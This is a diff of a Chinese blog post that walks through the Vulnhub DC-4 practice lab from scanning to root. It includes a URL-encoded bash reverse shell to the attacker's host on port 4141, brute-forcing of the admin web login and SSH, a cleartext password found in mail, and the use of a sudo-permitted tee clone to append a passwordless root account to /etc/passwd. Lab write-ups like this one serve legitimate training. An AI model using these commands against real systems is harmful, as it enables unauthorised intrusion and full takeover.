@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      214 字
+      1.4k 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      24
        分钟
     </span>
   
@@ -229,12 +229,17 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：October 30, 2021 am
+                  本文最后更新于：October 30, 2021 pm
                 
               </p>
             
             <div class="markdown-body">
-              <h3 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>DC 4探测</p>
+              <h3 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h3><p>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
+<p>Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.</p>
+<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
+<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p>
+<h3 id="靶场获取"><a href="#靶场获取" class="headerlink" title="靶场获取"></a>靶场获取</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p>
+<h3 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>DC 4探测</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -sP 192.168.199.0/24<br>...<br>Nmap scan report <span class="hljs-keyword">for</span> dc-4.lan (192.168.199.194)<br>Host is up (0.0023s latency).<br>MAC Address: 00:0C:29:05:CB:3E (VMware)<br></code></pre></td></tr></table></figure>
 
 
@@ -244,13 +249,93 @@
 
 
 
-<p>访问80端口</p>
+<p>访问80端口，发现一个登陆界面</p>
+<img src="/img/Vulnhub-DC-4过关笔记/1.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<h4 id="爆破管理员账号密码"><a href="#爆破管理员账号密码" class="headerlink" title="爆破管理员账号密码"></a>爆破管理员账号密码</h4><p>目录扫描没发现什么有用的信息，sql注入也没有，使用burpsuite进行爆破，发现管理员账号密码admin/happy</p>
+<img src="/img/Vulnhub-DC-4过关笔记/2.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>当前有一个执行命令的地方</p>
+<img src="/img/Vulnhub-DC-4过关笔记/3.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>抓包，执行命令反弹一个shell回来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.199.146/4141 0&gt;&amp;1&#x27;的URL编码</span><br>%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%39%39%2e%31%34%36%2f%34%31%34%31%20%30%3e%26%31%27<br></code></pre></td></tr></table></figure>
+
+
+
+<p>发送数据包</p>
+<img src="/img/Vulnhub-DC-4过关笔记/4.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>Kali得到一个会话</p>
+<img src="/img/Vulnhub-DC-4过关笔记/5.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<h4 id="提权（失败）"><a href="#提权（失败）" class="headerlink" title="提权（失败）"></a>提权（失败）</h4><p>在使用www-data提权的过程中，<strong>发现不存在SUID提权</strong>，于是转向使用<strong>内核提权漏洞进行提权</strong>，但是在EXP编译的过程中，会提示找不到cc1这个文件，使用软连接又提示权限不够，所以需要换一种思路</p>
+<h4 id="登录jim"><a href="#登录jim" class="headerlink" title="登录jim"></a>登录jim</h4><p>在得到的shell中查看有哪些用户可以登录，发现了除root之外有三个用户charles、jim和sam</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat /etc/passwd | grep <span class="hljs-string">&quot;/bin/bash&quot;</span><br>root:x:0:0:root:/root:/bin/bash<br>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash<br></code></pre></td></tr></table></figure>
+
+
+
+<p>在jim的家目录下发现了一个密码的备份文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat /home/jim/backups/old-passwords.bak<br>000000<br>12345<br>iloveyou<br>1q2w3e4r5t<br>1234<br>123456a<br>qwertyuiop<br>monkey<br>123321<br>dragon<br>654321<br>666666<br>...<br></code></pre></td></tr></table></figure>
+
+
+
+<p>制作字典，使用hydra进行密码爆破，拿到账号密码 jim / jibril04</p>
+<img src="/img/Vulnhub-DC-4过关笔记/6.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>ssh登录</p>
+<img src="/img/Vulnhub-DC-4过关笔记/7.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>登录之后家目录下存在三个文件，backups是备份文件，test.sh是一个脚本，打开没什么内容，mbox是root发送的一封邮件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><br>$ cat test.sh <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..5&#125;<br><span class="hljs-keyword">do</span><br> sleep 1<br> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Learn bash they said.&quot;</span><br> sleep 1<br> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Bash is good they said.&quot;</span><br><span class="hljs-keyword">done</span><br> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;But I&#x27;d rather bash my head against a brick wall.&quot;</span><br> <br>$ cat mbox <br>From root@dc-4 Sat Apr 06 20:20:04 2019<br>Return-path: &lt;root@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000<br>Received: from root by dc-4 with <span class="hljs-built_in">local</span> (Exim 4.89)<br>        (envelope-from &lt;root@dc-4&gt;)<br>        id 1hCiQe-0000gc-EC<br>        <span class="hljs-keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000<br>To: jim@dc-4<br>Subject: Test<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=<span class="hljs-string">&quot;UTF-8&quot;</span><br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;<br>From: root &lt;root@dc-4&gt;<br>Date: Sat, 06 Apr 2019 20:20:04 +1000<br>Status: RO<br><br>This is a <span class="hljs-built_in">test</span>.<br></code></pre></td></tr></table></figure>
+
+
+
+<p>随后在/var/mail下发现了charles发给jim的一封邮件，里面含有自己的账号密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat /var/mail/jim<br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with <span class="hljs-built_in">local</span> (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        <span class="hljs-keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=<span class="hljs-string">&quot;UTF-8&quot;</span><br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O<br><br>Hi Jim,<br><br>I<span class="hljs-string">&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password is:  ^xHhA&amp;hvim0y</span><br><span class="hljs-string"></span><br><span class="hljs-string">See ya,</span><br><span class="hljs-string">Charles</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="登录charles"><a href="#登录charles" class="headerlink" title="登录charles"></a>登录charles</h4><p>可以发现，charles有权限以root执行teehee命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> charles on dc-4:<br>    env_reset, mail_badpass, secure_path=/usr/<span class="hljs-built_in">local</span>/sbin\:/usr/<span class="hljs-built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="获取Flag-1"><a href="#获取Flag-1" class="headerlink" title="获取Flag"></a>获取Flag</h4><p>使用SUID进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;privilege::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd<br>privilege::0:0:::/bin/bash<br>charles@dc-4:~$ su privilege<br><br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-comment"># ls /root</span><br>flag.txt<br><span class="hljs-comment"># cat /root/flag.txt </span><br><br>888       888          888 888      8888888b.                             888 888 888 888 <br>888   o   888          888 888      888  <span class="hljs-string">&quot;Y88b                            888 888 888 888 </span><br><span class="hljs-string">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="hljs-string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="hljs-string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="hljs-string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888 <br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P <br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span class="hljs-string">&quot;   &quot;</span>   <span class="hljs-string">&quot;   &quot;</span>  <br>888P     Y888  <span class="hljs-string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="hljs-string">&quot;Y88P&quot;</span>  888  888  <span class="hljs-string">&quot;Y8888  888 888 888 888 </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Congratulations!!!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="hljs-string">who have provided feedback, and who have taken time to complete these little</span><br><span class="hljs-string">challenges.</span><br><span class="hljs-string"></span><br><span class="hljs-string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></code></pre></td></tr></table></figure>
+
+
+
+<img src="/img/Vulnhub-DC-4过关笔记/8.png" srcset="/img/loading.gif" lazyload>
 
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Vulnhub/">Vulnhub</a>
+                    
+                  </div>
                 
               </div>
               
